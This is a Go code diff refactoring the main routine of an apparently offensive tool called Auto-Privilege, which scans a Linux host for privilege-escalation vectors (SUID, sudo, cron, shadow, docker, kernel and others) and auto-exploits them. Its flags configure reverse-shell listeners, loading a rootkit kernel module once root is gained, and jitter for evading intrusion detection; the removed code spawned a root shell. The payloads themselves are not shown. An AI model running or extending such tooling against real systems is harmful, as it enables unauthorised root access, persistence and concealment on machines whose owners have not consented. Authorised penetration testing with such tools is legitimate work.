@@ -5,15 +5,173 @@ import (
 	"fmt"
 	"net"
 	"os"
-	"sort"
+	"runtime"
+	"time"
 )
 
 func main() {
-	opts := parseFlags()
+	p := run()
 
-	p := &AutoPrivilege{Opts: opts}
+	elapsed := time.Since(p.Started)
 
-	printBanner()
+	// FASE 1: Scan
+	if !p.Opts.Quiet && !p.Opts.JSON {
+		fmt.Println(colorize("  [1/3] Scanning system...", AnsiCyan))
+	}
+	scanAll(p)
+
+	// FASE 2: Enumerate
+	if !p.Opts.Quiet && !p.Opts.JSON {
+		fmt.Println(colorize("\n  [2/3] Enumerating vectors...", AnsiCyan))
+	}
+	if p.Opts.Vector != "" {
+		names, err := parseVectorList(p.Opts.Vector)
+		if err != nil {
+			// unreachable: validated in run(), kept as a guard
+			fmt.Fprintf(os.Stderr, "  [-] %v\n", err)
+			os.Exit(2)
+		}
+		enumerateVectors(p, names)
+	} else {
+		enumerateAll(p)
+	}
+
+	// Print findings
+	if !p.Opts.JSON && !p.Opts.Quiet {
+		fmt.Println(colorize("\n  ── Findings ──", AnsiCyan))
+		shown := 0
+		for _, f := range p.Findings {
+			if f.Exploitable {
+				p.Print(f)
+				shown++
+			}
+		}
+		if shown == 0 {
+			fmt.Println(colorize("    (no exploitable findings — system looks clean)", AnsiGrey))
+		}
+	}
+
+	// FASE 3: Exploit
+	if p.Opts.Exploit && p.Opts.DryRun {
+		printDryRunPlan(p)
+		logDryRun(p.Opts)
+	} else if p.Opts.Exploit {
+		if isRoot() {
+			if !p.Opts.Quiet && !p.Opts.JSON {
+				fmt.Println(colorize("\n  [!] Already running as root — nothing to escalate", AnsiYellow))
+				fmt.Println(colorize("  [!] Tip: --dry-run shows the execution plan", AnsiGrey))
+			}
+			if p.Opts.Rooteame != "" {
+				tryRooteame(p)
+			}
+		} else {
+			if !p.Opts.Quiet && !p.Opts.JSON {
+				fmt.Println(colorize("\n  [3/3] Exploiting... (max risk: "+p.Opts.MaxRisk.String()+")", AnsiCyan))
+			}
+			exploitAll(p)
+		}
+	}
+
+	// No root obtained: show the strongest manual options instead of nothing.
+	if !p.Rooted && !isRoot() && p.Opts.Exploit && !p.Opts.Quiet && !p.Opts.JSON {
+		fmt.Println(colorize("\n  [*] No root obtained. Top vectors:", AnsiYellow))
+		printTopVectors(p, 5)
+	}
+
+	if p.Opts.Report != "" {
+		if err := p.WriteMarkdownReport(p.Opts.Report); err != nil {
+			fmt.Fprintf(os.Stderr, "  [-] report write failed: %v\n", err)
+		} else if !p.Opts.Quiet && !p.Opts.JSON {
+			fmt.Println(colorize("  [+] Markdown report written: "+p.Opts.Report, AnsiGreen))
+		}
+	}
+
+	if p.Opts.JSON {
+		if err := p.ExportJSON(); err != nil {
+			fmt.Fprintf(os.Stderr, "  [-] json export failed: %v\n", err)
+		}
+	}
+
+	printSummary(p, elapsed)
+
+	// Exit codes (documented): 0 = root or scan-only run, 1 = exploit ran
+	// without root, 2 = usage error.
+	if p.Opts.Exploit && !p.Opts.DryRun && !p.Rooted && !isRoot() {
+		os.Exit(1)
+	}
+}
+
+func run() *AutoPrivilege {
+	var opts Options
+	var risk string
+	var showVersion bool
+
+	flag.BoolVar(&opts.Exploit, "exploit", false, "Auto-exploit found vectors")
+	flag.StringVar(&risk, "risk", "safe", "Max risk: safe, low, medium, high, danger")
+	flag.StringVar(&opts.Vector, "vector", "", "Comma-separated vectors: suid,sudo,cron,passwd,shadow,docker,caps,nfs,path,service,kernel,cred")
+	flag.BoolVar(&opts.JSON, "json", false, "JSON output")
+	flag.BoolVar(&opts.Quiet, "quiet", false, "Quiet mode (exit code only)")
+	flag.StringVar(&opts.Rooteame, "rooteame", "", "Path to rootkit.ko to load on root (lab only)")
+	flag.BoolVar(&opts.Stealth, "stealth", false, "Add jitter between scanners and exploits")
+	flag.BoolVar(&opts.OneShot, "one-shot", false, "Stop after first successful exploit")
+	flag.StringVar(&opts.LHost, "lhost", "", "Listener host for reverse shells")
+	flag.StringVar(&opts.LPort, "lport", "4444", "Listener port for reverse shells")
+	flag.BoolVar(&opts.DryRun, "dry-run", false, "Scan and enumerate only, no exploitation")
+	flag.StringVar(&opts.LogFormat, "log", "text", "Log format: text, json")
+	flag.BoolVar(&opts.UpdateGTFO, "update-gtfobins", false, "Update and persist the GTFOBins database")
+	flag.BoolVar(&opts.NoColor, "no-color", false, "Disable ANSI colors (auto-off when piped)")
+	flag.BoolVar(&opts.Verbose, "verbose", false, "Verbose logging on stderr")
+	flag.BoolVar(&opts.ListGTFO, "list-gtfo", false, "Print the embedded GTFOBins database and exit")
+	flag.StringVar(&opts.Report, "report", "", "Write a markdown report to this path")
+	flag.BoolVar(&showVersion, "version", false, "Print version and exit")
+
+	flag.Usage = usage
+	flag.Parse()
+
+	// Fail fast on a bad --vector before wasting a full scan.
+	if opts.Vector != "" {
+		if _, err := parseVectorList(opts.Vector); err != nil {
+			fmt.Fprintf(os.Stderr, "  [-] %v\n", err)
+			os.Exit(2)
+		}
+	}
+
+	// Colors: auto-disable when piped, when told to, or when NO_COLOR is set.
+	setColorMode(isTerminal(os.Stdout) && !opts.NoColor && os.Getenv("NO_COLOR") == "")
+
+	if showVersion {
+		fmt.Printf("Auto-Privilege v%s (%s/%s)\n", Version, runtime.GOOS, runtime.GOARCH)
+		os.Exit(0)
+	}
+
+	if opts.ListGTFO {
+		printGTFOList()
+		os.Exit(0)
+	}
+
+	if !validMaxRisk(risk) {
+		fmt.Fprintf(os.Stderr, "  [-] invalid --risk %q (valid: safe, low, medium, high, danger)\n", risk)
+		os.Exit(2)
+	}
+	opts.MaxRisk = parseMaxRisk(risk)
+
+	if opts.Quiet {
+		opts.Exploit = true
+	}
+	if opts.LHost == "" {
+		opts.LHost = detectLocalIP()
+	}
+
+	p := &AutoPrivilege{Opts: opts, Started: time.Now()}
+
+	printBanner(opts)
+
+	if !opts.Quiet && !opts.JSON {
+		fmt.Printf("  %s %-10s  %s %-8d  %s %s\n\n",
+			colorize("USER:", AnsiGrey), amIRoot(),
+			colorize("PID:", AnsiGrey), os.Getpid(),
+			colorize("Host:", AnsiGrey), hostname())
+	}
 
 	if opts.UpdateGTFO {
 		if err := updateGTFOBins(opts); err != nil {
@@ -25,114 +183,7 @@ func main() {
 		}
 	}
 
-	fmt.Printf("  UID: %-10s  PID: %-8d  Host: %s\n\n",
-		amIRoot(), os.Getpid(), hostname())
-
-	// FASE 1: Scan
-	if !opts.Quiet && !opts.JSON {
-		fmt.Println(colorize("  [1/3] Scanning system...", AnsiCyan))
-	}
-	scanAll(p)
-
-	// FASE 2: Enum
-	if !opts.Quiet && !opts.JSON {
-		fmt.Println(colorize("\n  [2/3] Enumerating vectors...", AnsiCyan))
-	}
-
-	if opts.Vector != "" {
-		enumerateVector(p, opts.Vector)
-	} else {
-		enumerateAll(p)
-	}
-
-	// Print findings
-	if !opts.JSON && !opts.Quiet {
-		fmt.Println(colorize("\n  ── Findings ──", AnsiCyan))
-		for _, f := range p.Findings {
-			if f.Exploitable {
-				p.Print(f)
-			}
-		}
-	}
-
-	// FASE 3: Exploit
-	if opts.Exploit && !opts.DryRun {
-		if !opts.Quiet && !opts.JSON {
-			fmt.Println(colorize("\n  [3/3] Exploiting... (max risk: "+opts.MaxRisk.String()+")", AnsiCyan))
-		}
-
-		exploitAll(p)
-
-		if p.Rooted {
-			if !opts.JSON {
-				if !opts.Quiet {
-					fmt.Println(colorize("  [+] Root shell starting...\n", AnsiGreen))
-				}
-				if opts.Rooteame != "" {
-					tryRooteame(p)
-				}
-				spawnShell()
-			}
-			if opts.JSON {
-				p.ExportJSON()
-			}
-			os.Exit(0)
-		}
-	}
-
-	if opts.DryRun && opts.Exploit {
-		if !opts.Quiet && !opts.JSON {
-			fmt.Println(colorize("\n  [3/3] Dry-run mode — exploitation skipped", AnsiYellow))
-			fmt.Println(colorize("  [!] To exploit, remove --dry-run flag", AnsiYellow))
-		}
-	}
-
-	// No root
-	if !opts.Quiet && !opts.JSON {
-		fmt.Println(colorize("\n  [*] No root obtained. Top vectors:", AnsiYellow))
-		printTopVectors(p, 5)
-	}
-
-	if opts.JSON {
-		p.ExportJSON()
-	}
-
-	if opts.Quiet {
-		if p.Rooted {
-			os.Exit(0)
-		}
-		os.Exit(1)
-	}
-}
-
-func parseFlags() Options {
-	var opts Options
-	var risk string
-
-	flag.BoolVar(&opts.Exploit, "exploit", false, "Auto-exploit found vectors")
-	flag.StringVar(&risk, "risk", "safe", "Max risk: safe, low, medium, high, danger")
-	flag.StringVar(&opts.Vector, "vector", "", "Specific vector (suid,sudo,cron,passwd,docker)")
-	flag.BoolVar(&opts.JSON, "json", false, "JSON output")
-	flag.BoolVar(&opts.Quiet, "quiet", false, "Quiet mode (exit code only)")
-	flag.StringVar(&opts.Rooteame, "rooteame", "", "Path to rootkit.ko to load on root")
-	flag.BoolVar(&opts.Stealth, "stealth", false, "Slow scan to evade IDS")
-	flag.BoolVar(&opts.OneShot, "one-shot", false, "Stop after first successful exploit")
-	flag.StringVar(&opts.LHost, "lhost", "", "Listener host for reverse shells")
-	flag.StringVar(&opts.LPort, "lport", "4444", "Listener port for reverse shells")
-	flag.BoolVar(&opts.DryRun, "dry-run", false, "Scan and enumerate only, no exploitation")
-	flag.StringVar(&opts.LogFormat, "log", "text", "Log format: text, json")
-	flag.BoolVar(&opts.UpdateGTFO, "update-gtfobins", false, "Update GTFOBins database from upstream")
-
-	flag.Parse()
-
-	opts.MaxRisk = parseMaxRisk(risk)
-	if opts.Quiet {
-		opts.Exploit = true
-	}
-	if opts.LHost == "" {
-		opts.LHost = detectLocalIP()
-	}
-	return opts
+	return p
 }
 
 func hostname() string {
@@ -141,27 +192,6 @@ func hostname() string {
 		return "unknown"
 	}
 	return h
-}
-
-func printTopVectors(p *AutoPrivilege, n int) {
-	exploitable := make([]Vector, 0)
-	for _, v := range p.Vectors {
-		exploitable = append(exploitable, v)
-	}
-	sort.Slice(exploitable, func(i, j int) bool {
-		return exploitable[i].Risk < exploitable[j].Risk
-	})
-	count := 0
-	for _, v := range exploitable {
-		if count >= n {
-			break
-		}
-		p.PrintVector(v)
-		count++
-	}
-	if len(exploitable) == 0 {
-		fmt.Println(colorize("    (none found)", AnsiGrey))
-	}
 }
 
 func detectLocalIP() string {
